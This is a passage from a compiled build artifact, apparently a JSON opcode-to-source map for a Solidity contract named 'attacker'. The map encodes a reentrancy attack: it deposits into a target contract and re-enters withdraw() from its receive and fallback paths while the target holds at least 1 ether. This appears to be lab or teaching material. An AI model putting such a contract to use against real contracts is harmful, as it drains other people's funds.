      ],
      "op": "JUMPI",
      "path": "0"
    },
    "41": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "DUP1",
      "path": "0"
    },
    "42": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xD2EEF3A0"
    },
    "47": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "EQ",
      "path": "0"
    },
    "48": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xD5"
    },
    "51": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "52": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x68"
    },
    "55": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "JUMP",
      "path": "0"
    },
    "56": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "57": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "CALLDATASIZE",
      "path": "0"
    },
    "58": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x68"
    },
    "61": {
      "fn": null,
      "offset": [
        155,
        1149
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "62": {
      "fn": "attacker.<receive>",
      "offset": [
        600,
        617
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 0,
      "value": "0x66"
    },
    "65": {
      "fn": "attacker.<receive>",
      "offset": [
        612,
        616
      ],
      "op": "PUSH32",
      "path": "0",
      "value": "0x0"
    },
    "98": {
      "fn": "attacker.<receive>",
      "offset": [
        600,
        611
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xEA"
    },
    "101": {
      "fn": "attacker.<receive>",
      "jump": "i",
      "offset": [
        600,
        617
      ],
      "op": "JUMP",
      "path": "0"
    },
    "102": {
      "fn": "attacker.<receive>",
      "offset": [
        600,
        617
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "103": {
      "offset": [
        155,
        1149
      ],
      "op": "STOP",
      "path": "0"
    },
    "104": {
      "fn": "attacker.<receive>",
      "offset": [
        155,
        1149
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "105": {
      "fn": "attacker.<fallback>",
      "offset": [
        533,
        550
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 1,
      "value": "0x66"
    },
    "108": {
      "fn": "attacker.<fallback>",
      "offset": [
        545,
        549
      ],
      "op": "PUSH32",
      "path": "0",
      "value": "0x0"
    },
    "141": {
      "fn": "attacker.<fallback>",
      "offset": [
        533,
        544
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xEA"
    },
    "144": {
      "fn": "attacker.<fallback>",
      "jump": "i",
      "offset": [
        533,
        550
      ],
      "op": "JUMP",
      "path": "0"
    },
    "145": {
      "fn": "attacker.hack",
      "offset": [
        630,
        828
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "146": {
      "fn": "attacker.hack",
      "offset": [
        630,
        828
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x66"
    },
    "149": {
      "fn": "attacker.hack",
      "offset": [
        630,
        828
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x160"
    },
    "152": {
      "fn": "attacker.hack",
      "jump": "i",
      "offset": [
        630,
        828
      ],
      "op": "JUMP",
      "path": "0"
    },
    "153": {
      "offset": [
        179,
        201
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "154": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "155": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "DUP1",
      "path": "0"
    },
    "156": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "157": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xA5"
    },
    "160": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "161": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "163": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "DUP1",
      "path": "0"
    },
    "164": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "REVERT",
      "path": "0"
    },
    "165": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "166": {
      "op": "POP"
    },
    "167": {
      "offset": [
        179,
        201
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "169": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "170": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xB9"
    },
    "173": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "174": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "176": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "178": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "180": {
      "op": "SHL"
    },
    "181": {
      "op": "SUB"
    },
    "182": {
      "offset": [
        179,
        201
      ],
      "op": "AND",
      "path": "0"
    },
    "183": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "DUP2",
      "path": "0"
    },
    "184": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "JUMP",
      "path": "0"
    },
    "185": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "186": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "188": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "189": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "191": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "193": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "195": {
      "op": "SHL"
    },
    "196": {
      "op": "SUB"
    },
    "197": {
      "op": "SWAP1"
    },
    "198": {
      "op": "SWAP2"
    },
    "199": {
      "op": "AND"
    },
    "200": {
      "op": "DUP2"
    },
    "201": {
      "op": "MSTORE"
    },
    "202": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "204": {
      "op": "ADD"
    },
    "205": {
      "offset": [
        179,
        201
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "207": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "208": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "DUP1",
      "path": "0"
    },
    "209": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "210": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "SUB",
      "path": "0"
    },
    "211": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "212": {
      "fn": "attacker.hack",
      "offset": [
        179,
        201
      ],
      "op": "RETURN",
      "path": "0"
    },
    "213": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "214": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "215": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "DUP1",
      "path": "0"
    },
    "216": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "217": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0xE1"
    },
    "220": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "221": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "223": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "DUP1",
      "path": "0"
    },
    "224": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "REVERT",
      "path": "0"
    },
    "225": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "226": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "POP",
      "path": "0"
    },
    "227": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x66"
    },
    "230": {
      "fn": "attacker.withdrawing",
      "offset": [
        981,
        1147
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2EC"
    },
    "233": {
      "fn": "attacker.withdrawing",
      "jump": "i",
      "offset": [
        981,
        1147
      ],
      "op": "JUMP",
      "path": "0"
    },
    "234": {
      "fn": "attacker.chekBalance",
      "offset": [
        834,
        975
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "235": {
      "fn": "attacker.chekBalance",
      "offset": [
        914,
        924
      ],
      "op": "PUSH8",
      "path": "0",
      "value": "0xDE0B6B3A7640000"
    },
    "244": {
      "fn": "attacker.chekBalance",
      "offset": [
        895,
        902
      ],
      "op": "DUP2",
      "path": "0"
    },
    "245": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "247": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "249": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "251": {
      "op": "SHL"
    },
    "252": {
      "op": "SUB"
    },
    "253": {
      "fn": "attacker.chekBalance",
      "offset": [
        895,
        910
      ],
      "op": "AND",
      "path": "0"
    },
    "254": {
      "fn": "attacker.chekBalance",
      "offset": [
        895,
        910
      ],
      "op": "BALANCE",
      "path": "0"
    },
    "255": {
      "branch": 7,
      "fn": "attacker.chekBalance",
      "offset": [
        895,
        924
      ],
      "op": "LT",
      "path": "0"
    },
    "256": {
      "fn": "attacker.chekBalance",
      "offset": [
        891,
        969
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x15D"
    },
    "259": {
      "branch": 7,
      "fn": "attacker.chekBalance",
      "offset": [
        891,
        969
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "260": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 2,
      "value": "0x0"
    },
    "262": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "DUP1",
      "path": "0"
    },
    "263": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "264": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "266": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP1",
      "path": "0"
    },
    "267": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "268": {
      "op": "PUSH4",
      "value": "0x3CCFD60B"
    },
    "273": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "275": {
      "op": "SHL"
    },
    "276": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP2",
      "path": "0"
    },
    "277": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "278": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "279": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "280": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "282": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "284": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "286": {
      "op": "SHL"
    },
    "287": {
      "op": "SUB"
    },
    "288": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "289": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "290": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "AND",
      "path": "0"
    },
    "291": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "292": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        956
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x3CCFD60B"
    },
    "297": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        956
      ],
      "op": "SWAP3",
      "path": "0"
    },
    "298": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "300": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP1",
      "path": "0"
    },
    "301": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP5",
      "path": "0"
    },
    "302": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "ADD",
      "path": "0"
    },
    "303": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "SWAP4",
      "path": "0"
    },
    "304": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP3",
      "path": "0"
    },
    "305": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "306": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "SUB",
      "path": "0"
    },
    "307": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "ADD",
      "path": "0"
    },
    "308": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP2",
      "path": "0"
    },
    "309": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "DUP4",
      "path": "0"
    },
    "310": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        947
      ],
      "op": "DUP8",
      "path": "0"
    },
    "311": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP1",
      "path": "0"
    },
    "312": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "EXTCODESIZE",
      "path": "0"
    },
    "313": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "314": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP1",
      "path": "0"
    },
    "315": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "316": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x144"
    },
    "319": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "320": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "322": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP1",
      "path": "0"
    },
    "323": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "REVERT",
      "path": "0"
    },
    "324": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "325": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "POP",
      "path": "0"
    },
    "326": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "GAS",
      "path": "0"
    },
    "327": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "CALL",
      "path": "0"
    },
    "328": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "329": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP1",
      "path": "0"
    },
    "330": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "331": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x158"
    },
    "334": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "335": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "336": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "338": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "DUP1",
      "path": "0"
    },
    "339": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "340": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "341": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "343": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "REVERT",
      "path": "0"
    },
    "344": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "345": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "POP",
      "path": "0"
    },
    "346": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "POP",
      "path": "0"
    },
    "347": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "POP",
      "path": "0"
    },
    "348": {
      "fn": "attacker.chekBalance",
      "offset": [
        940,
        958
      ],
      "op": "POP",
      "path": "0"
    },
    "349": {
      "fn": "attacker.chekBalance",
      "offset": [
        891,
        969
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "350": {
      "fn": "attacker.chekBalance",
      "offset": [
        834,
        975
      ],
      "op": "POP",
      "path": "0"
    },
    "351": {
      "fn": "attacker.chekBalance",
      "jump": "o",
      "offset": [
        834,
        975
      ],
      "op": "JUMP",
      "path": "0"
    },
    "352": {
      "fn": "attacker.hack",
      "offset": [
        630,
        828
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "353": {
      "offset": [
        438,
        448
      ],
      "op": "CALLER",
      "path": "0"
    },
    "354": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "356": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "358": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "360": {
      "op": "SHL"
    },
    "361": {
      "op": "SUB"
    },
    "362": {
      "offset": [
        452,
        457
      ],
      "op": "PUSH32",
      "path": "0",
      "value": "0x0"
    },
    "395": {
      "offset": [
        438,
        457
      ],
      "op": "AND",
      "path": "0"
    },
    "396": {
      "fn": "attacker.hack",
      "offset": [
        438,
        457
      ],
      "op": "EQ",
      "path": "0"
    },
    "397": {
      "offset": [
        430,
        471
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C9"
    },
    "400": {
      "offset": [
        430,
        471
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "401": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "403": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "404": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "408": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "410": {
      "op": "SHL"
    },
    "411": {
      "offset": [
        430,
        471
      ],
      "op": "DUP2",
      "path": "0"
    },
    "412": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "413": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "415": {
      "offset": [
        430,
        471
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "417": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "DUP3",
      "path": "0"
    },
    "418": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "ADD",
      "path": "0"
    },
    "419": {
      "op": "MSTORE"
    },
    "420": {
      "op": "PUSH1",
      "value": "0x9"
    },
    "422": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "424": {
      "op": "DUP3"
    },
    "425": {
      "op": "ADD"
    },
    "426": {
      "op": "MSTORE"
    },
    "427": {
      "op": "PUSH9",
      "value": "0x2737BA1037BBB732B9"
    },
    "437": {
      "op": "PUSH1",
      "value": "0xB9"
    },
    "439": {
      "op": "SHL"
    },
    "440": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "442": {
      "op": "DUP3"
    },
    "443": {
      "op": "ADD"
    },
    "444": {
      "op": "MSTORE"
    },
    "445": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "447": {
      "op": "ADD"
    },
    "448": {
      "offset": [
        430,
        471
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "449": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "451": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "452": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "DUP1",
      "path": "0"
    },
    "453": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "454": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "SUB",
      "path": "0"
    },
    "455": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "456": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "REVERT",
      "optimizer_revert": true,
      "path": "0"
    },
    "457": {
      "fn": "attacker.hack",
      "offset": [
        430,
        471
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "458": {
      "fn": "attacker.hack",
      "offset": [
        704,
        714
      ],
      "op": "PUSH8",
      "path": "0",
      "statement": 3,
      "value": "0xDE0B6B3A7640000"
    },
    "467": {
      "fn": "attacker.hack",
      "offset": [
        691,
        700
      ],
      "op": "CALLVALUE",
      "path": "0"
    },
    "468": {
      "fn": "attacker.hack",
      "offset": [
        691,
        714
      ],
      "op": "LT",
      "path": "0"
    },
    "469": {
      "branch": 8,
      "fn": "attacker.hack",
      "offset": [
        691,
        714
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "470": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x221"
    },
    "473": {
      "branch": 8,
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "474": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "476": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "477": {
      "op": "PUSH3",
      "value": "0x461BCD"
    },
    "481": {
      "op": "PUSH1",
      "value": "0xE5"
    },
    "483": {
      "op": "SHL"
    },
    "484": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "DUP2",
      "path": "0"
    },
    "485": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "486": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "488": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "490": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "DUP3",
      "path": "0"
    },
    "491": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "ADD",
      "path": "0"
    },
    "492": {
      "op": "MSTORE"
    },
    "493": {
      "op": "PUSH1",
      "value": "0x1C"
    },
    "495": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "497": {
      "op": "DUP3"
    },
    "498": {
      "op": "ADD"
    },
    "499": {
      "op": "MSTORE"
    },
    "500": {
      "op": "PUSH32",
      "value": "0x57726F6E672076616C75652C206974206D757374206265203E3D203100000000"
    },
    "533": {
      "op": "PUSH1",
      "value": "0x44"
    },
    "535": {
      "op": "DUP3"
    },
    "536": {
      "op": "ADD"
    },
    "537": {
      "op": "MSTORE"
    },
    "538": {
      "op": "PUSH1",
      "value": "0x64"
    },
    "540": {
      "op": "ADD"
    },
    "541": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C0"
    },
    "544": {
      "op": "JUMP"
    },
    "545": {
      "fn": "attacker.hack",
      "offset": [
        683,
        747
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "546": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 4,
      "value": "0x0"
    },
    "548": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "DUP1",
      "path": "0"
    },
    "549": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "550": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "551": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x100"
    },
    "554": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "EXP",
      "path": "0"
    },
    "555": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "556": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "DIV",
      "path": "0"
    },
    "557": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "559": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "561": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "563": {
      "op": "SHL"
    },
    "564": {
      "op": "SUB"
    },
    "565": {
      "fn": "attacker.hack",
      "offset": [
        757,
        764
      ],
      "op": "AND",
      "path": "0"
    },
    "566": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "568": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "570": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "572": {
      "op": "SHL"
    },
    "573": {
      "op": "SUB"
    },
    "574": {
      "fn": "attacker.hack",
      "offset": [
        757,
        772
      ],
      "op": "AND",
      "path": "0"
    },
    "575": {
      "fn": "attacker.hack",
      "offset": [
        757,
        772
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xD0E30DB0"
    },
    "580": {
      "fn": "attacker.hack",
      "offset": [
        780,
        790
      ],
      "op": "PUSH8",
      "path": "0",
      "value": "0xDE0B6B3A7640000"
    },
    "589": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "591": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "592": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP3",
      "path": "0"
    },
    "593": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0xFFFFFFFF"
    },
    "598": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "AND",
      "path": "0"
    },
    "599": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0xE0"
    },
    "601": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "SHL",
      "path": "0"
    },
    "602": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "DUP2",
      "path": "0"
    },
    "603": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "604": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "606": {
      "fn": "attacker.hack",
      "offset": [
        757,
        793
      ],
      "op": "ADD",
      "path": "0"
    },
    "607": {
      "fn": "attacker.hack",
      "offset": [
